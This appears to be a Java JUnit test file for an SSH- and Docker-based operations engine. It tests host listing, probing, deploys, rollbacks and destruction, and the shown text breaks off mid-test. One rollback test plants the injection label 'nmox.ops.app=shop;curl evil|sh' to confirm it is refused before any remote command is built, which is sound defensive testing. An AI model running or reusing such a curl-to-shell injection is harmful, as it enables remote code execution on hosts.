package org.nmox.studio.infra.ops;

import java.io.File;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Deque;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicLong;
import java.util.function.Consumer;
import java.util.prefs.AbstractPreferences;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.nmox.studio.infra.ops.model.Evidence;
import org.nmox.studio.infra.ops.model.HostStatus;
import org.nmox.studio.infra.ops.model.OpsEdge;
import org.nmox.studio.infra.ops.model.OpsKind;
import org.nmox.studio.infra.ops.model.OpsNode;
import org.nmox.studio.infra.ops.model.Topology;
import org.nmox.studio.infra.ops.provider.HostRecord;
import org.nmox.studio.infra.ops.provider.HostSpec;
import org.nmox.studio.infra.ops.provider.OpsProvider;
import org.nmox.studio.infra.ops.provider.SimulatedWorld;
import org.nmox.studio.infra.ops.remote.HostProbe;
import org.nmox.studio.infra.ops.remote.RemoteRunner;
import org.nmox.studio.infra.ops.remote.SshTarget;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * The engine with everything asynchronous in the test's hand: an inline
 * EDT, lanes that queue until drained, a clock that moves when told.
 */
class OpsHubTest {

    /** A lane that queues; the test drains it, advancing the clock past each delay. */
    static final class ManualLane implements OpsHub.Lane {
        record Job(Runnable r, long due, boolean[] cancelled) {
        }

        final Deque<Job> jobs = new ArrayDeque<>();
        final AtomicLong clock;

        ManualLane(AtomicLong clock) {
            this.clock = clock;
        }

        @Override
        public Runnable post(Runnable r, long delayMillis) {
            boolean[] cancelled = {false};
            jobs.add(new Job(r, clock.get() + delayMillis, cancelled));
            return () -> cancelled[0] = true;
        }

        /** Runs everything queued, moving the clock to each job's due time; repeats until quiet or the bound. */
        void drain(int rounds) {
            for (int i = 0; i < rounds && !jobs.isEmpty(); i++) {
                List<Job> batch = new ArrayList<>(jobs);
                jobs.clear();
                for (Job j : batch) {
                    if (!j.cancelled[0]) {
                        clock.set(Math.max(clock.get(), j.due));
                        j.r.run();
                    }
                }
            }
        }
    }

    static final class MemoryPrefs extends AbstractPreferences {
        final Map<String, String> values = new HashMap<>();
        final Map<String, MemoryPrefs> kids = new HashMap<>();

        MemoryPrefs(AbstractPreferences parent, String name) {
            super(parent, name);
        }

        protected void putSpi(String k, String v) { values.put(k, v); }
        protected String getSpi(String k) { return values.get(k); }
        protected void removeSpi(String k) { values.remove(k); }
        protected void removeNodeSpi() { }
        protected String[] keysSpi() { return values.keySet().toArray(String[]::new); }
        protected String[] childrenNamesSpi() { return kids.keySet().toArray(String[]::new); }
        protected AbstractPreferences childSpi(String n) { return kids.computeIfAbsent(n, x -> new MemoryPrefs(this, x)); }
        protected void syncSpi() { }
        protected void flushSpi() { }
    }

    /** A provider the test scripts. */
    static class ScriptedProvider implements OpsProvider {
        final List<HostRecord> listed = new ArrayList<>();

        public String id() { return "scripted"; }
        public String displayName() { return "Scripted"; }
        public boolean simulated() { return false; }
        public boolean configured() { return true; }
        public org.nmox.studio.infra.ops.provider.ProviderOptions options() { return null; }
        int listings;
        public List<HostRecord> listHosts() { listings++; return new ArrayList<>(listed); }
        public HostRecord createHost(HostSpec spec) { throw new UnsupportedOperationException(); }
        public HostRecord readHost(String id) { return listed.stream().filter(r -> r.providerId().equals(id)).findFirst().orElse(null); }
        public void destroyHost(String id) { listed.removeIf(r -> r.providerId().equals(id)); }
        public String addSshKey(String n, String k) { return "1"; }
    }

    /** A runner that answers every host with the same probe lines. */
    static final class FixedRunner implements RemoteRunner {
        List<String> lines = List.of();
        /** What ssh itself says when the host does not answer (lines empty). */
        String refusal;
        int calls;

        @Override
        public Result run(SshTarget target, String remoteCommand, InputStream stdin, Consumer<String> onLine, Duration timeout) {
            calls++;
            lines.forEach(onLine);
            if (lines.isEmpty() && refusal != null) {
                onLine.accept(refusal);
            }
            return new Result(lines.isEmpty() ? 255 : 0, "", false);
        }
    }

    static final String WEB = "container {\"Names\":\"shop-web-1\",\"Image\":\"nmox/shop:1\",\"Status\":\"Up\",\"Ports\":\"0.0.0.0:80->3000/tcp\",\"Labels\":\"nmox.ops.app=shop,com.docker.compose.service=web,com.docker.compose.project=shop,com.docker.compose.depends_on=db:service_started:true\",\"Networks\":\"shop_default\"}";
    static final String DB = "container {\"Names\":\"shop-db-1\",\"Image\":\"postgres:16\",\"Status\":\"Up\",\"Ports\":\"5432/tcp\",\"Labels\":\"com.docker.compose.service=db,com.docker.compose.project=shop\",\"Networks\":\"shop_default\"}";
    static final String CACHE = "container {\"Names\":\"cache\",\"Image\":\"redis:7\",\"Status\":\"Up\",\"Ports\":\"\",\"Labels\":\"\",\"Networks\":\"bridge\"}";

    static List<String> probe(String... containers) {
        List<String> l = new ArrayList<>(List.of("nmox-probe 1", "os Linux", "load 0.5", "cpus 2", "mem 1000 400",
                "disk 1000 300", "uptime 100", "mosh yes", "docker yes", "cloudinit done"));
        l.addAll(List.of(containers));
        l.add("nmox-probe end");
        return l;
    }

    AtomicLong clock = new AtomicLong(1_700_000_000_000L);
    ManualLane cloud = new ManualLane(clock);
    ManualLane ssh = new ManualLane(clock);
    FixedRunner runner = new FixedRunner();
    MemoryPrefs prefs = new MemoryPrefs(null, "");
    ScriptedProvider provider = new ScriptedProvider();

    OpsHub hub() {
        return new OpsHub(clock::get, Runnable::run, runner, prefs, cloud, ssh).withProviders(List.of(provider));
    }

    @Test
    @DisplayName("a listing adds hosts, updates them in place, and removes what the provider stopped listing")
    void listing() {
        OpsHub hub = hub();
        provider.listed.add(new HostRecord("1", "alpha", "203.0.113.1", true, "active", Map.of("region", "nyc3")));
        provider.listed.add(new HostRecord("2", "beta", null, false, "new", Map.of()));
        hub.refresh();
        cloud.drain(3);
        Topology t = hub.topology();
        assertThat(t.nodes(OpsKind.HOST)).extracting(n -> n.id).containsExactly("scripted:1", "scripted:2");
        assertThat(t.node("scripted:1").status).isEqualTo(HostStatus.BOOTING);
        assertThat(t.node("scripted:2").status).isEqualTo(HostStatus.PROVISIONING);
        assertThat(t.edgesOf("scripted:1")).extracting(OpsEdge::kind).containsExactly("ssh");
        provider.listed.remove(1);
        provider.listed.set(0, new HostRecord("1", "alpha-renamed", "203.0.113.1", true, "active", Map.of()));
        hub.refresh();
        cloud.drain(3);
        assertThat(t.nodes(OpsKind.HOST)).hasSize(1);
        assertThat(t.node("scripted:1").label).isEqualTo("alpha-renamed");
        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(s -> s.contains("beta") && s.contains("no longer"));
    }

    @Test
    @DisplayName("a probe makes a host ready, its containers services, and every edge carries its evidence")
    void probeAndServices() {
        OpsHub hub = hub();
        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
        runner.lines = probe(WEB, DB, CACHE);
        ssh.drain(2);
        Topology t = hub.topology();
        assertThat(host.status).isEqualTo(HostStatus.READY);
        assertThat(host.telemetry.latest().loadShare()).isEqualTo(0.25);
        assertThat(host.facts).containsEntry("docker", "yes").containsEntry("mosh-server", "yes");
        assertThat(t.servicesOf(host.id)).extracting(n -> n.label).containsExactly("web", "db", "cache");
        Map<String, Evidence> byKey = new HashMap<>();
        for (OpsEdge e : t.edges()) {
            byKey.put(e.key(), e.evidence());
        }
        assertThat(byKey).containsEntry(host.id + ">" + host.id + "/shop-web-1:runs", Evidence.OBSERVED)
                .containsEntry(host.id + "/shop-web-1>" + host.id + "/shop-db-1:depends", Evidence.DECLARED)
                .containsEntry(host.id + "/shop-web-1>" + host.id + "/shop-db-1:reaches", Evidence.INFERRED);
        assertThat(t.edges()).noneMatch(e -> e.kind().equals("reaches") && e.to().endsWith("/cache"));
        assertThat(t.node(host.id + "/shop-web-1").facts).containsEntry("deployed by", "NMOX Studio (shop)");
        // the cache container goes away: so does its node, with a feed line
        runner.lines = probe(WEB, DB);
        hub.probe(host);
        ssh.drain(2);
        assertThat(t.servicesOf(host.id)).hasSize(2);
        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(s -> s.contains("cache is no longer running"));
        // silence: unreachable, said once
        runner.lines = List.of();
        hub.probe(host);
        ssh.drain(2);
        assertThat(host.status).isEqualTo(HostStatus.UNREACHABLE);
        assertThat(t.servicesOf(host.id)).as("services are not forgotten on one missed probe").hasSize(2);
    }

    @Test
    @DisplayName("a created simulated host is watched from request to ready, every step observed and announced")
    void createAndWatch() {
        OpsHub hub = new OpsHub(clock::get, Runnable::run, runner, prefs, cloud, ssh).withProviders(List.of());
        hub.setSimulation(true);
        OpsProvider sim = hub.provider("simulation");
        ((org.nmox.studio.infra.ops.provider.SimulatedOps) sim).world().unpaced();
        hub.createHost(sim, new HostSpec("demo", "sim1", "s-1vcpu-1gb", "ubuntu-24-04-x64", List.of(), ""));
        cloud.drain(1);
        OpsNode node = hub.topology().nodes(OpsKind.HOST).get(0);
        assertThat(node.simulated).isTrue();
        assertThat(node.status).isEqualTo(HostStatus.REQUESTED);
        List<HostStatus> seen = new ArrayList<>();
        for (int i = 0; i < 40 && node.status != HostStatus.READY; i++) {
            cloud.drain(1);
            ssh.drain(1);
            if (seen.isEmpty() || seen.get(seen.size() - 1) != node.status) {
                seen.add(node.status);
            }
        }
        assertThat(node.status).isEqualTo(HostStatus.READY);
        assertThat(seen).containsSubsequence(HostStatus.PROVISIONING, HostStatus.BOOTING, HostStatus.CONFIGURING, HostStatus.READY);
        assertThat(node.address).startsWith("203.0.113.");
        List<String> feed = hub.feed().stream().map(OpsEvent::text).toList();
        assertThat(feed).anyMatch(s -> s.contains("accepted demo"))
                .anyMatch(s -> s.contains("waiting for ssh"))
                .anyMatch(s -> s.contains("ssh answers on"))
                .anyMatch(s -> s.contains("is ready"));
        hub.setSimulation(false);
        assertThat(hub.topology().nodes(OpsKind.HOST)).isEmpty();
    }

    @Test
    @DisplayName("a deploy is refused by name: no host, unreachable, no docker, no Dockerfile")
    void deployRefusals(@TempDir Path project) throws Exception {
        OpsHub hub = hub();
        assertThat(hub.deployRefusal(null, project.toFile())).isEqualTo("pick a host");
        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
        assertThat(hub.deployRefusal(host, project.toFile())).contains("not reachable");
        runner.lines = probe().stream().map(l -> l.equals("docker yes") ? "docker no" : l).toList();
        ssh.drain(2);
        assertThat(hub.deployRefusal(host, project.toFile())).contains("no docker");
        runner.lines = probe();
        hub.probe(host);
        ssh.drain(2);
        assertThat(hub.deployRefusal(host, project.toFile())).contains("Dockerfile");
        Files.writeString(project.resolve("Dockerfile"), "FROM scratch\n");
        assertThat(hub.deployRefusal(host, project.toFile())).isNull();
        assertThat(hub.deploy(host, new File("/nowhere"), new org.nmox.studio.infra.ops.remote.DeployPlan("a", 80, 80, "1")))
                .as("a refused deploy returns no run").isNull();
    }

    @Test
    @DisplayName("hosts added by hand survive a restart through one preference entry each; forgetting one removes only it")
    void manualHostsPersist() {
        OpsHub hub = hub();
        hub.addManualHost(new SshTarget("deploy", "203.0.113.5", 2222, "/k/id"), "box");
        hub.addManualHost(new SshTarget("root", "example.org", 22, null), "");
        OpsHub again = hub();
        List<OpsNode> hosts = again.topology().nodes(OpsKind.HOST);
        assertThat(hosts).extracting(OpsNode::sshSpec).containsExactly("deploy@203.0.113.5:2222", "root@example.org");
        assertThat(hosts.get(0).identityFile).isEqualTo("/k/id");
        assertThat(hosts.get(0).label).isEqualTo("box");
        assertThat(hosts.get(1).label).isEqualTo("example.org");
        assertThat(hub().topology().nodes(OpsKind.HOST)).as("the order is stable across loads")
                .extracting(OpsNode::sshSpec).containsExactly("deploy@203.0.113.5:2222", "root@example.org");
        again.forgetManualHost(hosts.get(0));
        assertThat(hub().topology().nodes(OpsKind.HOST)).hasSize(1);
    }

    /** A runner that plays a deploy: records commands, answers verify with a container, fails where told. */
    static class DeployRunner implements RemoteRunner {
        final List<String> commands = new ArrayList<>();
        String failAt;

        @Override
        public Result run(SshTarget target, String remoteCommand, InputStream stdin, Consumer<String> onLine, Duration timeout) {
            commands.add(remoteCommand);
            if (remoteCommand.startsWith("echo nmox-probe 1")) {
                probe().forEach(onLine);
                return new Result(0, "", false);
            }
            if (stdin != null) {
                try {
                    stdin.readAllBytes();
                } catch (java.io.IOException ex) {
                    throw new AssertionError(ex);
                }
            }
            if (failAt != null && remoteCommand.startsWith(failAt)) {
                onLine.accept("the host says no");
                return new Result(1, "the host says no", false);
            }
            if (remoteCommand.startsWith("sleep 2; docker ps")) {
                onLine.accept("{\"Names\":\"nmox-shop\",\"Image\":\"nmox/shop:1\",\"Status\":\"Up\",\"Ports\":\"0.0.0.0:80->3000/tcp\",\"Labels\":\"nmox.ops.app=shop\",\"Networks\":\"bridge\"}");
                onLine.accept("http 80 200");
            }
            return new Result(0, "", false);
        }
    }

    @Test
    @DisplayName("a deploy through the engine runs to the end, tracks its steps, announces the port, and probes afterwards")
    void deployThroughTheEngine(@TempDir Path project) throws Exception {
        Files.writeString(project.resolve("Dockerfile"), "FROM scratch\nEXPOSE 3000\n");
        DeployRunner dr = new DeployRunner();
        OpsHub hub = new OpsHub(clock::get, Runnable::run, dr, prefs, cloud, ssh).withProviders(List.of(provider));
        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
        ssh.drain(2);
        List<String> states = new ArrayList<>();
        hub.addListener(new OpsHub.Listener() {
            public void event(OpsEvent e) { }
            public void stateChanged() {
                DeployRun r = hub.deployOf(host.id);
                if (r != null && r.current() != null && (states.isEmpty() || !states.get(states.size() - 1).equals(r.current().name()))) {
                    states.add(r.current().name());
                }
            }
        });
        DeployRun run = hub.deploy(host, project.toFile(), new org.nmox.studio.infra.ops.remote.DeployPlan("shop", 80, 3000, "1"));
        assertThat(run).isNotNull();
        assertThat(hub.deployRefusal(host, project.toFile())).as("a second deploy waits for the first").contains("still running");
        ssh.drain(3);
        assertThat(run.finished).isTrue();
        assertThat(run.ok()).isTrue();
        assertThat(run.outcome.httpCode()).isEqualTo("200");
        assertThat(states).containsExactly("BUNDLE", "UPLOAD", "SWAP", "BUILD", "RUN", "VERIFY");
        assertThat(run.steps.values()).allMatch(st -> st == DeployRun.StepState.OK);
        assertThat(run.tail()).isNotEmpty();
        assertThat(dr.commands).hasSize(7); // the first probe, five steps, the probe after
        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("shop is up on box:80"))
                .anyMatch(t -> t.contains("verify ok"));
        assertThat(hub.deployRefusal(host, project.toFile())).isNull();
    }

    @Test
    @DisplayName("a deploy that fails at the build stops there and names the step and the host's last words")
    void deployStops(@TempDir Path project) throws Exception {
        Files.writeString(project.resolve("Dockerfile"), "FROM scratch\n");
        DeployRunner dr = new DeployRunner();
        dr.failAt = "docker build";
        OpsHub hub = new OpsHub(clock::get, Runnable::run, dr, prefs, cloud, ssh).withProviders(List.of(provider));
        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
        ssh.drain(2);
        DeployRun run = hub.deploy(host, project.toFile(), new org.nmox.studio.infra.ops.remote.DeployPlan("shop", 80, 3000, "1"));
        ssh.drain(3);
        assertThat(run.finished).isTrue();
        assertThat(run.ok()).isFalse();
        assertThat(run.steps.get(org.nmox.studio.infra.ops.remote.Deployer.Step.BUILD)).isEqualTo(DeployRun.StepState.FAILED);
        assertThat(run.steps.get(org.nmox.studio.infra.ops.remote.Deployer.Step.RUN)).isEqualTo(DeployRun.StepState.PENDING);
        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("Deploy stopped at build") && t.contains("the host says no"));
    }

    /** A host running one deployed app, whose image history and answers the test sets. */
    static final class RollbackRunner implements RemoteRunner {
        final List<String> commands = new ArrayList<>();
        String label = "nmox.ops.app=shop";
        String image = "nmox/shop:300";
        String ports = "0.0.0.0:80->3000/tcp";
        List<String> tags = List.of("300", "latest", "100", "200");
        boolean imagesFail;

        @Override
        public Result run(SshTarget target, String remoteCommand, InputStream stdin, Consumer<String> onLine, Duration timeout) {
            commands.add(remoteCommand);
            String row = "{\"Names\":\"nmox-shop\",\"Image\":\"" + image + "\",\"Status\":\"Up\",\"Ports\":\"" + ports
                    + "\",\"Labels\":\"" + label + "\",\"Networks\":\"bridge\"}";
            if (remoteCommand.startsWith("echo nmox-probe 1")) {
                probe("container " + row).forEach(onLine);
                return new Result(0, "", false);
            }
            if (remoteCommand.startsWith("docker images ")) {
                if (imagesFail) {
                    onLine.accept("Cannot connect to the Docker daemon");
                    return new Result(1, "Cannot connect to the Docker daemon", false);
                }
                tags.forEach(onLine);
                return new Result(0, "", false);
            }
            if (remoteCommand.startsWith("docker rm -f")) {
                image = remoteCommand.substring(remoteCommand.lastIndexOf(' ') + 1);
            }
            if (remoteCommand.startsWith("sleep 2; docker ps")) {
                onLine.accept(row.replace("\"Image\":\"nmox/shop:300\"", "\"Image\":\"" + image + "\""));
                onLine.accept("http 80 200");
            }
            return new Result(0, "", false);
        }
    }

    private OpsNode onlyService(OpsHub hub) {
        List<OpsNode> services = hub.topology().nodes(OpsKind.SERVICE);
        assertThat(services).hasSize(1);
        return services.get(0);
    }

    @Test
    @DisplayName("a rollback asks the host what it holds, offers the newest older image, runs two steps, and says where it landed")
    void rollbackThroughTheEngine() {
        RollbackRunner rr = new RollbackRunner();
        OpsHub hub = new OpsHub(clock::get, Runnable::run, rr, prefs, cloud, ssh).withProviders(List.of(provider));
        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
        ssh.drain(2);
        OpsNode service = onlyService(hub);
        assertThat(service.app).as("the label is on the node, raw").isEqualTo("shop");
        OpsHub.RollbackOffer[] offer = {null};
        hub.rollbackOffer(service, o -> offer[0] = o);
        assertThat(offer[0]).as("the answer waits for the host").isNull();
        ssh.drain(2);
        assertThat(offer[0].ok()).as(String.valueOf(offer[0].refusal())).isTrue();
        assertThat(offer[0].fromStamp()).isEqualTo("300");
        assertThat(offer[0].plan()).isEqualTo(new org.nmox.studio.infra.ops.remote.DeployPlan("shop", 80, 3000, "200"));
        rr.commands.clear();
        DeployRun run = hub.rollback(host, offer[0].plan(), offer[0].fromStamp());
        assertThat(run.rollback).isTrue();
        assertThat(run.steps.keySet()).as("a rollback has only the steps it runs")
                .containsExactly(org.nmox.studio.infra.ops.remote.Deployer.Step.RUN,
                        org.nmox.studio.infra.ops.remote.Deployer.Step.VERIFY);
        OpsHub.RollbackOffer[] second = {null};
        hub.rollbackOffer(service, o -> second[0] = o);
        assertThat(second[0].refusal()).as("one run per host at a time").contains("still running");
        ssh.drain(3);
        assertThat(run.ok()).isTrue();
        assertThat(rr.commands).startsWith(offer[0].plan().run(), offer[0].plan().verify());
        assertThat(rr.commands.get(0)).endsWith(" nmox/shop:200");
        assertThat(hub.feed()).extracting(OpsEvent::text)
                .anyMatch(t -> t.contains("back from image 300 to image 200"))
                .anyMatch(t -> t.contains("shop on box runs image 200 again"));
        assertThat(onlyService(hub).facts.get("image")).as("the probe after reads the new truth").isEqualTo("nmox/shop:200");
    }

    @Test
    @DisplayName("a rollback is refused by name: not ours, no port, nothing older, images unreadable — and a hostile label reaches no shell")
    void rollbackRefusals() {
        RollbackRunner rr = new RollbackRunner();
        OpsHub hub = new OpsHub(clock::get, Runnable::run, rr, prefs, cloud, ssh).withProviders(List.of(provider));
        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "box");
        ssh.drain(2);
        OpsHub.RollbackOffer[] offer = {null};
        java.util.function.Supplier<String> ask = () -> {
            offer[0] = null;
            hub.rollbackOffer(onlyService(hub), o -> offer[0] = o);
            ssh.drain(2);
            return offer[0].refusal();
        };
        rr.tags = List.of("300", "latest");
        assertThat(ask.get()).contains("no image of shop older than").contains("300");
        rr.imagesFail = true;
        assertThat(ask.get()).contains("could not read the images of shop on box").contains("Docker daemon");
        rr.imagesFail = false;
        // from here the host's answers change, so re-probe before asking
        rr.ports = "3000/tcp";
        hub.probe(host);
        ssh.drain(2);
        assertThat(ask.get()).contains("has no port mapping the Hub can read");
        rr.ports = "0.0.0.0:80->3000/tcp";
        rr.image = "someone/else:1";
        hub.probe(host);
        ssh.drain(2);
        assertThat(ask.get()).as("the label is ours but the image is not: said as that, not as \"not deployed from here\"")
                .contains("runs someone/else:1, which is not an image NMOX Studio tagged");
        rr.image = "nmox/shop:300";
        rr.label = "nmox.ops.app=shop;curl evil|sh";
        hub.probe(host);
        ssh.drain(2);
        rr.commands.clear();
        assertThat(ask.get()).contains("was not deployed from NMOX Studio");
        assertThat(rr.commands).as("a label that is not a slug is refused before any remote line is built").isEmpty();
        rr.label = "";
        hub.probe(host);
        ssh.drain(2);
        assertThat(onlyService(hub).app).isNull();
        assertThat(ask.get()).contains("was not deployed from NMOX Studio");
        assertThat(hub.rollback(null, null, null)).isNull();
    }

    @Test
    @DisplayName("destroying a provider host removes it and says billing stops; a provider's refusal keeps it and says why")
    void destroy() {
        OpsHub hub = hub();
        provider.listed.add(new HostRecord("1", "alpha", "203.0.113.1", true, "active", Map.of()));
        hub.refresh();
        cloud.drain(2);
        OpsNode node = hub.topology().node("scripted:1");
        hub.destroyHost(node);
        assertThat(node.status).isEqualTo(HostStatus.DESTROYING);
        cloud.drain(2);
        assertThat(hub.topology().node("scripted:1")).isNull();
        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("alpha destroyed"));
        // a provider that refuses
        OpsProvider stubborn = new ScriptedProvider() {
            @Override
            public void destroyHost(String id) {
                throw new RuntimeException("HTTP 422: locked");
            }
        };
        OpsHub hub2 = new OpsHub(clock::get, Runnable::run, runner, prefs, cloud, ssh).withProviders(List.of(stubborn));
        provider.listed.add(new HostRecord("2", "beta", "203.0.113.2", true, "active", Map.of()));
        hub2.applyRecord(stubborn, new HostRecord("2", "beta", "203.0.113.2", true, "active", Map.of()));
        OpsNode beta = hub2.topology().node("scripted:2");
        hub2.destroyHost(beta);
        cloud.drain(2);
        assertThat(hub2.topology().node("scripted:2")).isNotNull();
        assertThat(beta.lastProblem).contains("locked");
        assertThat(hub2.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("Destroy failed"));
    }

    @Test
    @DisplayName("a provider that fails to list or to create says so in the feed and leaves the topology as it was")
    void providerFailures() {
        OpsProvider broken = new ScriptedProvider() {
            @Override
            public List<HostRecord> listHosts() {
                throw new RuntimeException("HTTP 401: Unable to authenticate you");
            }

            @Override
            public HostRecord createHost(HostSpec spec) {
                throw new RuntimeException("HTTP 422: region unavailable");
            }
        };
        OpsHub hub = new OpsHub(clock::get, Runnable::run, runner, prefs, cloud, ssh).withProviders(List.of(broken));
        hub.refresh();
        cloud.drain(2);
        hub.createHost(broken, new HostSpec("demo", "r", "s", "i", List.of(), ""));
        cloud.drain(2);
        assertThat(hub.topology().nodes(OpsKind.HOST)).isEmpty();
        List<String> feed = hub.feed().stream().map(OpsEvent::text).toList();
        assertThat(feed).anyMatch(t -> t.contains("Unable to authenticate")).anyMatch(t -> t.contains("refused") && t.contains("region unavailable"));
    }

    @Test
    @DisplayName("polling probes every addressed host while on, and stops when told")
    void polling() {
        OpsHub hub = hub();
        hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "a");
        hub.addManualHost(new SshTarget("root", "203.0.113.6", 22, null), "b");
        runner.lines = probe();
        ssh.drain(2);
        int before = runner.calls;
        hub.startPolling();
        ssh.drain(1); // the tick: it posts one probe per host and the next tick
        assertThat(runner.calls).isEqualTo(before);
        hub.stopPolling(); // cancels the next tick; the probes already posted still run
        ssh.drain(5);
        assertThat(runner.calls).as("one probe per host, and no further tick").isEqualTo(before + 2);
    }

    @Test
    @DisplayName("the simulation's addresses are the documentation range and nothing else owns them")
    void simulationAddresses() {
        assertThat(SimulatedWorld.owns("203.0.113.42")).isTrue();
        assertThat(SimulatedWorld.owns("203.0.114.1")).isFalse();
        assertThat(SimulatedWorld.owns(null)).isFalse();
    }

    // ---- the review of 3.11.0: each of these failed on the code as shipped ----

    @Test
    @DisplayName("a host that never answers says so once, with ssh's own reason, and stops pretending to boot")
    void neverAnsweringHostSpeaks() {
        OpsHub hub = hub();
        runner.refusal = "root@203.0.113.5: Permission denied (publickey).";
        OpsNode host = hub.addManualHost(new SshTarget("root", "203.0.113.5", 22, null), "typo");
        assertThat(host.status).isEqualTo(HostStatus.BOOTING);
        ssh.drain(2);
        assertThat(host.status).as("nobody is bringing it up: booting forever would be a lie").isEqualTo(HostStatus.UNREACHABLE);
        assertThat(host.lastProblem).isEqualTo("root@203.0.113.5: Permission denied (publickey).");
        hub.probe(host);
        ssh.drain(2);
        hub.probe(host);
        ssh.drain(2);
        assertThat(hub.feed()).extracting(OpsEvent::text).filteredOn(t -> t.contains("does not answer ssh"))
                .as("said once, not on every poll").hasSize(1).first().asString().contains("Permission denied (publickey)");
        // and when it does answer, the problem is gone and the feed says so
        runner.lines = probe();
        hub.probe(host);
        ssh.drain(2);
        assertThat(host.status).isEqualTo(HostStatus.READY);
        assertThat(host.lastProblem).isNull();
        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("ssh answers on typo"));
        // then silence again: this time it STOPPED, and the reason travels
        runner.lines = List.of();
        runner.refusal = "ssh: connect to host 203.0.113.5 port 22: Operation timed out";
        hub.probe(host);
        ssh.drain(2);
        assertThat(hub.feed()).extracting(OpsEvent::text)
                .anyMatch(t -> t.contains("typo stopped answering ssh") && t.contains("Operation timed out"));
    }

    /** A provider whose servers are active with an address the moment they are made, as a fast one's can be. */
    static final class InstantProvider extends ScriptedProvider {
        RuntimeException readFails;
        boolean gone;

        @Override
        public HostRecord createHost(HostSpec spec) {
            HostRecord r = new HostRecord("7", spec.name(), "203.0.113.7", true, "active", Map.of());
            listed.add(r);
            return r;
        }

        @Override
        public HostRecord readHost(String id) {
            if (readFails != null) {
                throw readFails;
            }
            return gone ? null : super.readHost(id);
        }
    }

    @Test
    @DisplayName("the provisioning watch survives meeting another probe of the same host: its ask waits for that answer")
    void watchSurvivesAProbeInFlight() {
        InstantProvider fast = new InstantProvider();
        OpsHub hub = new OpsHub(clock::get, Runnable::run, runner, prefs, cloud, ssh).withProviders(List.of(fast));
        hub.createHost(fast, new HostSpec("quick", "r", "s", "i", List.of(), ""));
        cloud.drain(1); // accepted: the node is BOOTING and its first probe is already in flight
        OpsNode node = hub.topology().node("scripted:7");
        assertThat(node.status).isEqualTo(HostStatus.BOOTING);
        assertThat(ssh.jobs).as("one probe in flight").hasSize(1);
        cloud.drain(1); // the watch reads the provider and asks for a probe — while that one is still out
        assertThat(ssh.jobs).as("it did not start a second").hasSize(1);
        ssh.drain(1);   // ssh refuses: the host is still booting
        assertThat(node.status).as("refused is expected while it is being brought up").isEqualTo(HostStatus.BOOTING);
        assertThat(cloud.jobs).as("the watch heard the answer and scheduled its next look").isNotEmpty();
        assertThat(hub.feed()).extracting(OpsEvent::text).noneMatch(t -> t.contains("does not answer"));
        runner.lines = probe();
        for (int i = 0; i < 6 && node.status != HostStatus.READY; i++) {
            cloud.drain(1);
            ssh.drain(1);
        }
        assertThat(node.status).isEqualTo(HostStatus.READY);
        assertThat(node.facts).doesNotContainKey("watch");
    }

    @Test
    @DisplayName("a watched server the provider no longer has is removed and said; an unreadable provider is said once")
    void watchMeetsAGoneServerAndAFailingProvider() {
        InstantProvider fast = new InstantProvider();
        OpsHub hub = new OpsHub(clock::get, Runnable::run, runner, prefs, cloud, ssh).withProviders(List.of(fast));
        hub.createHost(fast, new HostSpec("brief", "r", "s", "i", List.of(), ""));
        cloud.drain(1);
        fast.readFails = new RuntimeException("HTTP 503: try later");
        for (int i = 0; i < 4; i++) {
            cloud.drain(1);
            ssh.drain(1);
        }
        assertThat(hub.feed()).extracting(OpsEvent::text).filteredOn(t -> t.contains("HTTP 503"))
                .as("four failed reads, one sentence").hasSize(1);
        assertThat(hub.topology().node("scripted:7")).as("still there, still watched").isNotNull();
        fast.readFails = null;
        fast.gone = true;
        cloud.drain(1);
        ssh.drain(1);
        cloud.drain(1);
        assertThat(hub.topology().node("scripted:7")).as("the provider says there is no such server").isNull();
        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("Scripted no longer has brief, which was still coming up"));
    }

    @Test
    @DisplayName("a watch that runs out of time stops the sweep: the host is unreachable, not forever becoming")
    void watchGivesUpHonestly() {
        InstantProvider fast = new InstantProvider();
        OpsHub hub = new OpsHub(clock::get, Runnable::run, runner, prefs, cloud, ssh).withProviders(List.of(fast));
        hub.createHost(fast, new HostSpec("slow", "r", "s", "i", List.of(), ""));
        cloud.drain(1);
        OpsNode node = hub.topology().node("scripted:7");
        clock.addAndGet(OpsHub.WATCH_LIMIT_MILLIS + 60_000);
        for (int i = 0; i < 4; i++) {
            cloud.drain(1);
            ssh.drain(1);
        }
        assertThat(hub.feed()).extracting(OpsEvent::text).anyMatch(t -> t.contains("is not ready after 15 minutes"));
        assertThat(node.status).isEqualTo(HostStatus.UNREACHABLE);
        assertThat(node.status.inProgress()).isFalse();
    }

    @Test
    @DisplayName("a failed destroy leaves the host what it was — an unreachable server does not turn green")
    void failedDestroyRestoresTheStatus() {
        OpsProvider stubborn = new ScriptedProvider() {
            @Override
            public void destroyHost(String id) {
                throw new RuntimeException("HTTP 422: locked");
            }
        };
        OpsHub hub = new OpsHub(clock::get, Runnable::run, runner, prefs, cloud, ssh).withProviders(List.of(stubborn));
        OpsNode node = hub.applyRecord(stubborn, new HostRecord("2", "beta", "203.0.113.2", true, "active", Map.of()));
        ssh.drain(2); // nobody answers
        assertThat(node.status).isEqualTo(HostStatus.UNREACHABLE);
        hub.destroyHost(node);
        cloud.drain(2);
